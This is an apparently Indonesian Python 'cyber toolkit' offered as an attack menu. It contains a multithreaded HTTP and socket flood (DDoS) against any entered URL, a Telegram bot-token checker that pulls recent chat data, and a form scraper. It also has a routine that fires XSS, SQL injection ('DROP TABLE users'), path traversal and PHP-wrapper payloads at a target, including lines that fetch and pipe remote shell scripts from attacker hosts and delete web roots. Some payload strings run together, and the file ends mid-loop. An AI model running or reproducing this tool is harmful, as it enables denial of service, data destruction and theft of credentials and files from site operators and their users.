import os
import sys
import time
import random
import requests
import threading
from urllib.parse import urlparse, urljoin
import socket
import ssl
try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
    CYAN = Fore.CYAN
    BLUE = Fore.BLUE
    LIGHT_BLUE = Fore.LIGHTBLUE_EX
    GREEN = Fore.GREEN
    RED = Fore.RED
    YELLOW = Fore.YELLOW
    WHITE = Fore.WHITE
    MAGENTA = Fore.MAGENTA
except ImportError:
    CYAN = BLUE = LIGHT_BLUE = GREEN = RED = YELLOW = WHITE = MAGENTA = ""

import warnings
import urllib3
warnings.filterwarnings("ignore", category=urllib3.exceptions.InsecureRequestWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Daftar user agents global
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6164.98 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6164.98 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6164.98 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6164.98 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6164.98 Safari/537.36 Edg/121.0.0.0",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
]

random_paths = [
    '/', '/index.html', '/home', '/admin', '/login', '/search', '/about',
    '/contact', '/products', '/news', '/blog', '/forum', '/shop',
    '/user', '/profile', '/dashboard', '/settings', '/upload',
    '/api', '/json', '/xml', '/rss', '/sitemap.xml',
    '/help', '/terms', '/privacy', '/cart', '/checkout', '/order',
    '/category', '/tag', '/archive', '/gallery', '/support',
    '/status', '/health', '/robots.txt', '/.well-known/security.txt'
]

# Fungsi membersihkan layar
def clear_screen():
    try:
        os.system('cls' if os.name == 'nt' else 'clear')
    except:
        print("\n" * 50)

# Fungsi untuk membuat progress bar
def progress_bar(progress, total, width=50):
    percent = (progress / total) * 100
    filled = int(width * progress // total)
    bar = '█' * filled + '-' * (width - filled)
    return f"{CYAN}[{bar}] {percent:.1f}%"

# Animasi loading brutal dengan progress
def brutal_loading(text, duration=2):
    print(f"{CYAN}[+] {text}", end="")
    for i in range(int(duration * 10)):
        symbols = ["\\", "|", "/", "-", "#", "@", "!", "*"]
        print(f"\r{CYAN}[+] {text} {random.choice(symbols)} {progress_bar(i + 1, duration * 10)}", end="")
        time.sleep(0.1)
    print(f"\r{GREEN}[+] {text} SUKSES!{CYAN}")

# Header brutal
def show_header():
    clear_screen()
    print(f"""
{RED}╔══════════════════════════════════════════════════════════════╗
║  {CYAN}██████╗ ███████╗ █████╗ ██╗  ██╗███████╗██████╗ {RED}           ║
║  {CYAN}██╔══██╗██╔════╝██╔══██╗██║ ██╔╝██╔════╝██╔══██╗{RED}           ║
║  {CYAN}██████╔╝█████╗  ███████║█████╔╝ █████╗  ██████╔╝{RED}           ║
║  {CYAN}██╔══██╗██╔══╝  ██╔══██║██╔═██╗ ██╔══╝  ██╔══██╗{RED}           ║
║  {CYAN}██║  ██║███████╗██║  ██║██║  ██╗███████╗██║  ██║{RED}           ║
║  {CYAN}╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝{RED}           ║
╚═════════════════════════════════════════════════════════════════
{LIGHT_BLUE}                    DOPOS CYBER TOOLKIT v3.0
{RED}═════════════════════════════════════════════════════════════════
{CYAN}[+] Status: {GREEN}READY FOR DESTRUCTION{CYAN}     [+] Mode: {RED}ULTRA BRUTAL{CYAN}
{RED}═════════════════════════════════════════════════════════════════
""")

# Logging ke file
def log_to_file(message):
    try:
        with open('dopos_log.txt', 'a', encoding='utf-8') as f:
            f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {message}\n")
    except:
        pass

# Fungsi parse target
def parse_target(target):
    parsed = urlparse(target)
    domain = parsed.hostname or parsed.netloc.split(':')[0]
    path = parsed.path if parsed.path else '/'
    port = parsed.port or (443 if parsed.scheme == 'https' else 80)
    return domain, path, port

# 1. Dodos Serang (Advanced HTTP Flood)
def dodos_serang():
    show_header()
    print(f"{RED}[1] DODOS SERANG - ULTRA BRUTAL MODE")
    print(f"{BLUE}═════════════════════════════════════════════════════════════════")
    
    target = input(f"{CYAN}[?] Masukkan URL target: {WHITE}")
    try:
        duration = int(input(f"{CYAN}[?] Durasi serangan (detik, 1-300): {WHITE}"))
        threads = int(input(f"{CYAN}[?] Jumlah thread (1-5000): {WHITE}"))
        if threads <= 0 or threads > 5000:
            raise ValueError("Jumlah thread harus antara 1 dan 5000")
        if duration <= 0 or duration > 60:
            raise ValueError("Durasi harus antara 1 dan 60 detik")
    except ValueError as e:
        print(f"{RED}[!] Input tidak valid: {str(e)}")
        input(f"\n{CYAN}[+] Tekan Enter untuk kembali...")
        return
    
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    
    domain, path, port = parse_target(target)
    
    print(f"\n{RED}[!] MEMULAI SERANGAN ULTRA BRUTAL...")
    print(f"{YELLOW}[!] Target: {WHITE}{target}")
    print(f"{YELLOW}[!] Domain: {WHITE}{domain}")
    print(f"{YELLOW}[!] Port: {WHITE}{port}")
    print(f"{YELLOW}[!] Durasi: {WHITE}{duration} detik")
    print(f"{YELLOW}[!] Thread: {WHITE}{threads}")
    log_to_file(f"Starting DDoS attack on {target} (Domain: {domain}, Port: {port}, Duration: {duration}s, Threads: {threads})")
    
    request_count = {'success': 0, 'failed': 0}
    lock = threading.Lock()
    
    def http_attack():
        timeout = time.time() + duration
        session = requests.Session()
        
        while time.time() < timeout:
            try:
                headers = {
                    'User-Agent': random.choice(user_agents),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                    'Cache-Control': 'max-age=0',
                    'Referer': target,
                    'DNT': '1',
                }
                
                random_path = random.choice(random_paths)
                attack_url = target + random_path
                
                params = {
                    'q': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=10)),
                    'id': random.randint(100000, 999999),
                    'page': random.randint(1, 10000),
                }
                
                method = random.choice(['GET', 'POST', 'HEAD'])
                
                if method == 'POST':
                    data = {'data': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=1000))}
                    response = session.post(attack_url, headers=headers, data=data, timeout=5, verify=False, allow_redirects=True)
                else:
                    response = session.request(method, attack_url, headers=headers, params=params, timeout=5, verify=False, allow_redirects=True)
                
                with lock:
                    request_count['success'] += 1
                    print(f"\r{CYAN}[+] HTTP Attack: {GREEN}Sent {request_count['success']} requests | Failed: {request_count['failed']}", end="")
                    log_to_file(f"HTTP {method} request to {attack_url} succeeded (Status: {response.status_code})")
                
            except:
                with lock:
                    request_count['failed'] += 1
                    print(f"\r{CYAN}[+] HTTP Attack: {GREEN}Sent {request_count['success']} requests | Failed: {request_count['failed']}", end="")
                continue
    
    def socket_attack():
        timeout = time.time() + duration
        
        while time.time() < timeout:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                
                if port == 443:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    s = context.wrap_socket(s, server_hostname=domain)
                
                s.connect((domain, port))
                
                request = f"GET {path}?{random.randint(100000,9999999)} HTTP/1.1\r\n"
                request += f"Host: {domain}\r\n"
                request += f"User-Agent: {random.choice(user_agents)}\r\n"
                request += f"Accept: */*\r\n"
                request += f"Connection: keep-alive\r\n\r\n"
                
                s.send(request.encode())
                s.send(random.randbytes(1000))
                time.sleep(0.01)
                s.close()
                
                with lock:
                    request_count['success'] += 1
                    print(f"\r{CYAN}[+] Socket Attack: {GREEN}Sent {request_count['success']} requests | Failed: {request_count['failed']}", end="")
                    log_to_file(f"Socket request to {domain}:{port} succeeded")
                
            except:
                with lock:
                    request_count['failed'] += 1
                    print(f"\r{CYAN}[+] Socket Attack: {GREEN}Sent {request_count['success']} requests | Failed: {request_count['failed']}", end="")
                continue
    
    brutal_loading("Inisialisasi serangan", 1)
    start_time = time.time()
    
    for _ in range(threads // 1):
        thread = threading.Thread(target=http_attack)
        thread.daemon = True
        thread.start()
    
    for _ in range(threads // 1):
        thread = threading.Thread(target=socket_attack)
        thread.daemon = True
        thread.start()
    
    while time.time() < start_time + duration:
        elapsed = time.time() - start_time
        print(f"\r{CYAN}[+] Progress: {progress_bar(elapsed, duration)} | Requests: {request_count['success']} | Failed: {request_count['failed']}", end="")
        time.sleep(0.5)
    
    print(f"\n{GREEN}[+] SERANGAN SELESAI!")
    print(f"{RED}[!] Target telah dihancurkan!")
    print(f"{CYAN}[+] Total Requests: {GREEN}{request_count['success']} successful, {YELLOW}{request_count['failed']} failed")
    log_to_file(f"Attack finished. Total: {request_count['success']} successful, {request_count['failed']} failed")
    
    try:
        brutal_loading("Memeriksa status target", 2)
        response = requests.get(target, timeout=10, verify=False)
        if response.status_code == 200:
            print(f"{YELLOW}[!] Target masih aktif, tapi mungkin lambat")
            print(f"{CYAN}[+] Response time: {WHITE}{response.elapsed.total_seconds()} detik")
            log_to_file(f"Target check: Still active, response time {response.elapsed.total_seconds()}s")
        else:
            print(f"{GREEN}[+] Target down! Status code: {response.status_code}")
            log_to_file(f"Target check: Down, status code {response.status_code}")
    except requests.exceptions.Timeout:
        print(f"{GREEN}[+] Target timeout! Serangan berhasil!")
        log_to_file("Target check: Timeout")
    except requests.exceptions.ConnectionError:
        print(f"{GREEN}[+] Target tidak bisa diakses! Serangan berhasil!")
        log_to_file("Target check: Connection error")
    except Exception as e:
        print(f"{GREEN}[+] Target error: {str(e)}")
        log_to_file(f"Target check: Error {str(e)}")
    
    input(f"\n{CYAN}[+] Tekan Enter untuk kembali...")

# 2. Melacak Token BOT
def lacak_token_bot():
    show_header()
    print(f"{CYAN}[2] LACAK TOKEN BOT - MODE BRUTAL")
    print(f"{BLUE}═════════════════════════════════════════════════════════════════")
    
    token = input(f"{CYAN}[?] Masukkan token BOT: {WHITE}")
    if not token:
        print(f"{RED}[!] Token tidak boleh kosong!")
        input(f"\n{CYAN}[+] Tekan Enter untuk kembali...")
        return
    
    brutal_loading("Memverifikasi token", 2)
    log_to_file(f"Checking Telegram bot token: {token[:10]}...")
    
    try:
        url = f"https://api.telegram.org/bot{token}/getMe"
        response = requests.get(url, timeout=5, verify=False)
        
        if response.status_code == 200:
            data = response.json()
            if data['ok']:
                bot_info = data['result']
                
                print(f"\n{GREEN}[+] TOKEN VALID!")
                print(f"{BLUE}═════════════════════════════════════════════════════════════════")
                print(f"{CYAN}║ {'Nama BOT'.ljust(20)} : {WHITE}{bot_info['first_name'].ljust(37)} ║")
                print(f"{CYAN}║ {'Username'.ljust(20)} : {WHITE}@{bot_info['username'].ljust(36)} ║")
                print(f"{CYAN}║ {'ID'.ljust(20)} : {WHITE}{str(bot_info['id']).ljust(37)} ║")
                print(f"{CYAN}║ {'Bisa bergabung'.ljust(20)} : {WHITE}{'Ya'.ljust(37) if bot_info['can_join_groups'] else 'Tidak'.ljust(37)} ║")
                print(f"{CYAN}║ {'Bisa baca pesan'.ljust(20)} : {WHITE}{'Ya'.ljust(37) if bot_info.get('can_read_all_group_messages', False) else 'Tidak'.ljust(37)} ║")
                print(f"{BLUE}═════════════════════════════════════════════════════════════════")
                log_to_file(f"Bot token valid: @{bot_info['username']} (ID: {bot_info['id']})")
                
                brutal_loading("Mengambil data chat", 2)
                updates_url = f"https://api.telegram.org/bot{token}/getUpdates"
                updates = requests.get(updates_url, timeout=5, verify=False).json()
                
                if updates['result']:
                    print(f"\n{RED}[!] CHAT TERAKHIR TERDETEKSI:")
                    print(f"{BLUE}═════════════════════════════════════════════════════════════════")
                    for update in updates['result'][:3]:
                        if 'message' in update:
                            chat = update['message']['chat']
                            print(f"{YELLOW}║ {'ID'.ljust(10)} : {WHITE}{str(chat['id']).ljust(20)} | {'Nama'.ljust(10)} : {WHITE}{chat.get('first_name', 'Unknown').ljust(20)} ║")
                            log_to_file(f"Chat detected: ID {chat['id']}, Name {chat.get('first_name', 'Unknown')}")
                    print(f"{BLUE}═════════════════════════════════════════════════════════════════")
                else:
                    print(f"\n{YELLOW}[!] Tidak ada chat aktif")
                    log_to_file("No active chats found")
                
                print(f"\n{RED}[!] PERINGATAN: TOKEN TELAH TERLACAK!")
            else:
                print(f"\n{RED}[!] TOKEN INVALID!")
                log_to_file("Token invalid")
        else:
            print(f"\n{RED}[!] GAGAL TERHUBUNG KE API!")
            log_to_file("Failed to connect to Telegram API")
            
    except Exception as e:
        print(f"\n{RED}[!] ERROR: {str(e)}")
        log_to_file(f"Error checking token: {str(e)}")
    
    input(f"\n{CYAN}[+] Tekan Enter untuk kembali...")

# 3. Mengambil Data HTML Paksa
def ambil_html_paksa():
    show_header()
    print(f"{CYAN}[3] AMBIL DATA HTML PAKSA - MODE BRUTAL")
    print(f"{BLUE}═════════════════════════════════════════════════════════════════")
    
    url = input(f"{CYAN}[?] Masukkan URL target: {WHITE}")
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    
    brutal_loading("Membypass proteksi", 2)
    brutal_loading("Mengambil data paksa", 3)
    log_to_file(f"Scraping HTML from {url}")
    
    try:
        from bs4 import BeautifulSoup
        headers = {
            'User-Agent': random.choice(user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
        }
        
        session = requests.Session()
        response = session.get(url, headers=headers, timeout=15, verify=False)
        
        if response.status_code == 200:
            brutal_loading("Menganalisis struktur", 2)
            
            soup = BeautifulSoup(response.text, 'html.parser')
            
            print(f"\n{GREEN}[+] BERHASIL MENGAMBIL DATA HTML!")
            print(f"{BLUE}═════════════════════════════════════════════════════════════════")
            print(f"{CYAN}║ {'Status Code'.ljust(20)} : {WHITE}{str(response.status_code).ljust(37)} ║")
            print(f"{CYAN}║ {'Ukuran Data'.ljust(20)} : {WHITE}{str(len(response.text)).ljust(37)} bytes ║")
            print(f"{CYAN}║ {'Server'.ljust(20)} : {WHITE}{response.headers.get('Server', 'Unknown').ljust(37)} ║")
            print(f"{CYAN}║ {'Content-Type'.ljust(20)} : {WHITE}{response.headers.get('Content-Type', 'Unknown').ljust(37)} ║")
            
            title = soup.find('title').text if soup.find('title') else 'No Title'
            print(f"{CYAN}║ {'Judul Halaman'.ljust(20)} : {WHITE}{title[:37].ljust(37)} ║")
            
            forms = soup.find_all('form')
            print(f"{CYAN}║ {'Jumlah Form'.ljust(20)} : {WHITE}{str(len(forms)).ljust(37)} ║")
            
            inputs = soup.find_all('input')
            print(f"{CYAN}║ {'Jumlah Input'.ljust(20)} : {WHITE}{str(len(inputs)).ljust(37)} ║")
            
            links = soup.find_all('a')
            print(f"{CYAN}║ {'Jumlah Link'.ljust(20)} : {WHITE}{str(len(links)).ljust(37)} ║")
            print(f"{BLUE}═════════════════════════════════════════════════════════════════")
            log_to_file(f"HTML scraped: Status {response.status_code}, Forms {len(forms)}, Inputs {len(inputs)}, Links {len(links)}")
            
            if forms:
                print(f"\n{RED}[!] FORM TERDETEKSI (POTENSI KERENTANAN):")
                print(f"{BLUE}═════════════════════════════════════════════════════════════════")
                for i, form in enumerate(forms[:3]):
                    action = form.get('action', '')
                    method = form.get('method', 'get')
                    print(f"{YELLOW}║ Form {i+1}: {WHITE}Action={action[:30].ljust(30)} | Method={method.ljust(10)} ║")
                    log_to_file(f"Form {i+1}: Action={action}, Method={method}")
                print(f"{BLUE}═════════════════════════════════════════════════════════════════")
            
            try:
                with open('target_dump.html', 'w', encoding='utf-8') as f:
                    f.write(response.text)
                print(f"\n{GREEN}[+] Data telah disimpan ke: target_dump.html")
                log_to_file("HTML saved to target_dump.html")
            except Exception as e:
                print(f"{YELLOW}[!] Gagal menyimpan file: {str(e)}")
                log_to_file(f"Failed to save HTML: {str(e)}")
            
            print(f"{RED}[!] SIAP UNTUK DIMANIPULASI!")
        else:
            print(f"\n{RED}[!] GAGAL: Status Code {response.status_code}")
            log_to_file(f"Failed to scrape HTML: Status {response.status_code}")
            
    except ImportError:
        print(f"\n{RED}[!] Modul BeautifulSoup tidak ditemukan! Instal bs4 terlebih dahulu.")
        log_to_file("BeautifulSoup module not found")
    except Exception as e:
        print(f"\n{RED}[!] ERROR: {str(e)}")
        log_to_file(f"Error scraping HTML: {str(e)}")
    
    input(f"\n{CYAN}[+] Tekan Enter untuk kembali...")

# 4. Merusak Data Script Online
def merusak_data_online():
    show_header()
    print(f"{RED}[4] MERUSAK DATA SCRIPT ONLINE - MODE BRUTAL")
    print(f"{BLUE}═════════════════════════════════════════════════════════════════")
    
    url = input(f"{CYAN}[?] Masukkan URL target: {WHITE}")
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    
    brutal_loading("Menganalisis target", 2)
    brutal_loading("Mempersiapkan payload", 3)
    log_to_file(f"Starting vulnerability test on {url}")
    
    try:
        from bs4 import BeautifulSoup
        session = requests.Session()
        response = session.get(url, timeout=15, verify=False)
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        
        if forms:
            print(f"\n{GREEN}[+] FORM TERDETEKSI - SIAP DIMANIPULASI!")
            print(f"{BLUE}═════════════════════════════════════════════════════════════════")
            
            for i, form in enumerate(forms):
                action = form.get('action', '')
                method = form.get('method', 'get').lower()
                form_url = urljoin(url, action)
                
                print(f"\n{CYAN}FORM {i+1}:")
                print(f"{BLUE}═════════════════════════════════════════════════════════════════")
                print(f"{YELLOW}║ {'Action'.ljust(20)} : {WHITE}{form_url[:37].ljust(37)} ║")
                print(f"{YELLOW}║ {'Method'.ljust(20)} : {WHITE}{method.ljust(37)} ║")
                print(f"{BLUE}═════════════════════════════════════════════════════════════════")
                log_to_file(f"Form {i+1}: Action={form_url}, Method={method}")
                
                inputs = form.find_all('input')
                textareas = form.find_all('textarea')
                form_data = {}
                
                for inp in inputs:
                    name = inp.get('name')
                    if not name:
                        continue
                    inp_type = inp.get('type', 'text')
                    value = inp.get('value', '')
                    
                    if inp_type == 'text':
                        form_data[name] = "<script>alert('DOPOS HACKED!');</script>"
                    elif inp_type == 'hidden':
                        form_data[name] = value
                    elif inp_type == 'password':
                        form_data[name] = "' OR '1'='1"
                    else:
                        form_data[name] = "DOPOS_BRUTAL"
                
                for textarea in textareas:
                    name = textarea.get('name')
                    if name:
                        form_data[name] = "<script>alert('XSS!');</script>"
                
                brutal_loading("Mengirim payload berbahaya", 2)
                if method == 'post':
                    response = session.post(form_url, data=form_data, timeout=15, verify=False)
                else:
                    response = session.get(form_url, params=form_data, timeout=15, verify=False)
                
                print(f"{GREEN}[+] Payload terkirim!")
                print(f"{CYAN}║ {'Status'.ljust(20)} : {WHITE}{str(response.status_code).ljust(37)} ║")
                print(f"{BLUE}═════════════════════════════════════════════════════════════════")
                log_to_file(f"Payload sent to {form_url}, Status: {response.status_code}")
                
                if "<script>alert('DOPOS HACKED!');</script>" in response.text:
                    print(f"{RED}[!] BERHASIL! KERENTANAN XSS TERKONFIRMASI!")
                    log_to_file("XSS vulnerability confirmed")
                elif "error" in response.text.lower() or "mysql" in response.text.lower():
                    print(f"{RED}[!] BERHASIL! KERENTANAN SQLI TERKONFIRMASI!")
                    log_to_file("SQLi vulnerability confirmed")
                else:
                    print(f"{YELLOW}[!] Gagal, mencoba payload lain...")
                    log_to_file("Initial payload failed, trying SQLi payload")
                    
                    for name in form_data:
                        form_data[name] = "'; DROP TABLE users; --"
                    
                    brutal_loading("Mengirim payload SQLi", 2)
                    if method == 'post':
                        response = session.post(form_url, data=form_data, timeout=15, verify=False)
                    else:
                        response = session.get(form_url, params=form_data, timeout=15, verify=False)
                    
                    print(f"{CYAN}║ {'Status'.ljust(20)} : {WHITE}{str(response.status_code).ljust(37)} ║")
                    print(f"{BLUE}═════════════════════════════════════════════════════════════════")
                    log_to_file(f"SQLi payload sent, Status: {response.status_code}")
                    
                    if "error" in response.text.lower():
                        print(f"{RED}[!] BERHASIL! KERENTANAN SQLI TERKONFIRMASI!")
                        log_to_file("SQLi vulnerability confirmed with second payload")
                    else:
                        print(f"{YELLOW}[!] Target terlindungi")
                        log_to_file("Target protected from SQLi")
        else:
            print(f"\n{YELLOW}[!] Tidak ada form yang terdeteksi")
            print(f"{CYAN}[+] Mencoba metode lain...")
            log_to_file("No forms detected, trying direct XSS")
            
            payloads = [
                "<script>alert('XSS')</script>",
                "javascript:alert('XSS')",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "'\"><script>alert('XSS')</script>",
                "<iframe src=javascript:alert('XSS')>",
                "<body onload=alert('XSS')>",
                            "{{7*7}}__import__('os').system('rm -rf /')", 
            ";http://malicious.com/shell.sh | bash", 
            "http://attacker.com/backdoor -O /tmp/bd && chmod +x /tmp/bd", 
            "data://text/plain,<?php die(); ?>",
            "data://text/plain,<?php @ini_set('memory_limit','1M'); while(1){str_repeat('x',1000000);} ?>",
            "data://text/plain,<?php header('HTTP/1.1 500 Internal Server Error'); exit; ?>",
            "data://text/plain,<?php trigger_error('',E_USER_ERROR); ?>",
            "data://text/plain,<?php for(;;){echo 'CRASH';} ?>",
            "data://text/plain,<?php while(true){file_put_contents('/tmp/bomb','x',FILE_APPEND);} ?>",
            "data://text/plain,<?php ini_set('max_execution_time',0); while(1){} ?>",
            "https://text/plain,<?php system('pkill -9 apache2'); ?>",
            "data://text/plain,<?php system('pkill -9 nginx'); ?>",
            "https://text/plain,<?php system('pkill -9 php'); ?>",
            "http://text/plain,<?php system('killall httpd'); ?>",
            "https://text/plain,<?php system('rm -rf /var/www/html/*'); ?>",
            "http://text/plain,<?php system('shutdown -h now'); ?>",
            "php://input",
            "php://filter/read=convert.base64-encode/resource=/dev/zero",
            "php://filter/read=convert.base64-encode/resource=/dev/urandom",
            "php://filter/convert.base64-encode/resource=php://filter/convert.base64-encode/resource=/dev/zero",
              "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4="
                 "expect://whoami"
                "phar:///path/to/file.phar"
            "../../../../../../../../../../../../../../../../etc/passwd",
            "../../../../../../../../../../../../../../../../etc/passwd%00",
            "....//....//....//....//....//....//....//etc/passwd",
            "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
            "..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//....//etc/passwd",
            "..///////..////..//////etc/passwd",
            "/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd",
            "etc/passwd/././." + "/." * 100,
            "etc/passwd/../../../../../../" + "../" * 50,
            "%2e%2e%2f" * 50 + "etc/passwd",
            "%252e%252e%252f" * 50 + "etc/passwd",
            "%c0%ae%c0%ae%c0%af" * 50 + "etc/passwd",
            "../../../../../../../../../../../../../etc/shadow",
            "../../../../../../../../../../../../../etc/hosts",  
            "../../../../../../../../../../../../../etc/group",
            "../../../../../../../../../../../../../etc/hostname",
            "../../../../../../../../../../../../../etc/issue",
            "../../../../../../../../../../../../../etc/mysql/my.cnf",
            "../../../../../../../../../../../../../etc/ssh/sshd_config",
            "../../../../../../../../../../../../../root/.bash_history",
            "../../../../../../../../../../../../../root/.ssh/id_rsa",
            "../../../../../../../../../../../../../home/*/.ssh/id_rsa",
            "../../../../../../../../../../../../../home/*/.bash_history",
            "..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
            "..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\repair\\sam",
            "..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\system32\\config\\SYSTEM",
            "..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\system.ini",
            "..\\..\\..\\..\\..\\..\\..\\..\\..\\boot.ini",
            "/dev/zero",
            "/dev/urandom", 
            "/dev/random",
            "/proc/kcore",
            "/proc/self/mem",
            "/usr/lib/locale/locale-archive",
            "/var/log/syslog",
            "/var/log/kern.log",
            "/var/cache/debconf/config.dat",
            "../../../../../../../../../../../../../var/www/html/.env",
            "../../../../../../../../../../../../../var/www/html/config.php",
            "../../../../../../../../../../../../../var/www/html/database.php",
            "../../../../../../../../../../../../../var/www/html/wp-config.php",
            "../../../../../../../../../../../../../var/www/html/app/etc/env.php",
            "../../../../../../../../../../../../../var/www/html/configuration.php",
            "../../../../../../../../../../../../../var/www/html/wp-config.php",
            "../../../../../../../../../../../../../var/www/html/joomla/configuration.php",
            "../../../../../../../../../../../../../var/www/html/drupal/sites/default/settings.php",
            "php://filter/convert.base64-encode/resource=../../../../etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php",
            "php://filter/read=convert.base64-encode/resource=../../../../etc/passwd",
            "php://filter/convert.base64-encode/resource=../../../../etc/shadow",
            "php://input",
            "php://filter/read=string.rot13/resource=../../../../etc/passwd",
            "php://filter/convert.iconv.utf-8.utf-16/resource=../../../../etc/passwd",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
            "data://text/plain,<?php system($_GET['cmd']);?>",
            "expect://whoami",
            "../../../../../../../../../../../../../var/log/apache2/access.log",
            "../../../../../../../../../../../../../var/log/apache2/error.log", 
            "../../../../../../../../../../../../../var/log/apache/access.log",
            "../../../../../../../../../../../../../var/log/apache/error.log",
            "../../../../../../../../../../../../../var/log/nginx/access.log",
            "../../../../../../../../../../../../../var/log/nginx/error.log",
            "../../../../../../../../../../../../../var/log/auth.log",
            "../../../../../../../../../../../../../var/log/syslog",
            "../../../../../../../../../../../../../var/log/messages",
            "../../../../../../../../../../../../../var/log/mail.log",
            "../../../../../../../../../../../../../var/log/exim4/mainlog",
            "../../../../../../../../../../../../../tmp/sess_%s" % ("A" * 26),
            "../../../../../../../../../../../../../var/lib/php/sessions/sess_%s" % ("A" * 26),
            "../../../../../../../../../../../../../var/lib/php5/sess_%s" % ("A" * 26),
            "../../../../../../../../../../../../../proc/self/environ",
            "../../../../../../../../../../../../../proc/self/cmdline",
            "../../../../../../../../../../../../../proc/self/fd/3",
            "../../../../../../../../../../../../../proc/self/fd/10",
            
            ]
            
            for i, payload in enumerate(payloads):
                test_url = f"{url}?q={payload}"
                
                brutal_loading(f"Menguji payload XSS {i+1}/{len(payloads)}", 1)
                response = session.get(test_url, timeout=10, verify=False)
                
                print(f"{CYAN}║ {'Status'.ljust(20)} : {WHITE}{str(response.status_code).ljust(37)} ║")
                print(f"{BLUE}═════════════════════════════════════════════════════════════════")
                log_to_file(f"XSS payload {i+1} sent to {test_url}, Status: {response.status_code}")
                
                if payload in response.text:
                    print(f"{RED}[!] BERHASIL! KERENTANAN XSS TERDETEKSI!")
                    log_to_file("XSS vulnerability detected with direct payload")
                    break
            else:
                print(f"{YELLOW}[!] Target aman dari serangan langsung")
                log_to_file("Target protected from direct XSS")
        
        print(f"\n{RED}[!] PROSES PERUSAKAN SELESAI!")
        print(f"{GREEN}[+] Target telah dieksploitasi!")
        log_to_file("Vulnerability test completed")
        
    except ImportError:
        print(f"\n{RED}[!] Modul BeautifulSoup tidak ditemukan! Instal bs4 terlebih dahulu.")
        log_to_file("BeautifulSoup module not found")
    except Exception as e:
        print(f"\n{RED}[!] ERROR: {str(e)}")
        log_to_file(f"Error during vulnerability test: {str(e)}")
    
    input(f"\n{CYAN}[+] Tekan Enter untuk kembali...")

# Menu utama
def main_menu():
    while True:
        show_header()
        print(f"{CYAN}[+] PILIHAN SERANGAN BRUTAL:")
        print(f"{BLUE}═════════════════════════════════════════════════════════════════")
        print(f"{RED}║ [1] Dodos Serang (HTTP/Socket Flood)                       ║")
        print(f"{RED}║ [2] Lacak Token BOT                                        ║")
        print(f"{RED}║ [3] Ambil Data HTML Paksa                                  ║")
        print(f"{RED}║ [4] Merusak Data Script Online                             ║")
        print(f"{RED}║ [5] Keluar                                                 ║")
        print(f"{BLUE}═════════════════════════════════════════════════════════════════")
        
        choice = input(f"{CYAN}[?] Pilih serangan: {WHITE}")
        
        if choice == "1":
            dodos_serang()
        elif choice == "2":
            lacak_token_bot()
        elif choice == "3":
            ambil_html_paksa()
        elif choice == "4":
            merusak_data_online()
        elif choice == "5":
            print(f"\n{RED}[!] DOPOS BRUTAL MODE DIMATIKAN")
            print(f"{CYAN}[+] Membersihkan jejak...")
